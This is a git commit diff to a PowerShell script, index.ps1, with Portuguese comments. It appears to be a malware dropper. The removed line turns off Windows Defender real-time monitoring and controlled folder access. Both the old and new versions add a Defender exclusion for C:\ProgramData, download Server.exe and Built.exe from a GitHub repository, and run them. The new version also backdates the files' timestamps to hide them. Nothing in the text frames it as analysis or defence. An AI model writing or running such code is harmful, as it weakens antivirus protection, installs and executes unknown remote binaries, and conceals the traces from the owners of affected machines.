a68c4f527a63b53d83ea2c01644b706f9ace2131
bexeybr <corpg2c@gmail.com>
2026-07-20 20:53:39 -0300

    Update index.ps1

--- index.ps1
+++ index.ps1
@@ -1,1 +1,17 @@
-powershell -ExecutionPolicy Bypass -Command "Set-MpPreference -EnableControlledFolderAccess Disabled; Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\ProgramData'; Invoke-WebRequest -Uri 'https://github.com/bexeybr/system/raw/refs/heads/main/Server.exe' -OutFile 'C:\ProgramData\Server.exe'; Invoke-WebRequest -Uri 'https://github.com/bexeybr/system/raw/refs/heads/main/Built.exe' -OutFile 'C:\ProgramData\Built.exe'; Start-Process 'C:\ProgramData\Server.exe'; Start-Process 'C:\ProgramData\Built.exe'; Start-Sleep -Seconds 300; Set-MpPreference -DisableRealtimeMonitoring $false; Set-MpPreference -EnableControlledFolderAccess Enabled"
+# Adicionar exclusão do ProgramData no Windows Defender
+Add-MpPreference -ExclusionPath "C:\ProgramData"
+
+# Baixar arquivos
+Invoke-WebRequest -Uri "https://github.com/bexeybr/system/raw/refs/heads/main/Server.exe" -OutFile "C:\ProgramData\Server.exe"
+Invoke-WebRequest -Uri "https://github.com/bexeybr/system/raw/refs/heads/main/Built.exe" -OutFile "C:\ProgramData\Built.exe"
+
+# Alterar data de modificação para 2025
+(Get-Item "C:\ProgramData\Server.exe" ).LastWriteTime = "01/01/2025 00:00:00"
+(Get-Item "C:\ProgramData\Server.exe").CreationTime = "01/01/2025 00:00:00"
+
+(Get-Item "C:\ProgramData\Built.exe").LastWriteTime = "01/01/2025 00:00:00"
+(Get-Item "C:\ProgramData\Built.exe").CreationTime = "01/01/2025 00:00:00"
+
+# Executar ambos
+Start-Process "C:\ProgramData\Server.exe"
+Start-Process "C:\ProgramData\Built.exe"
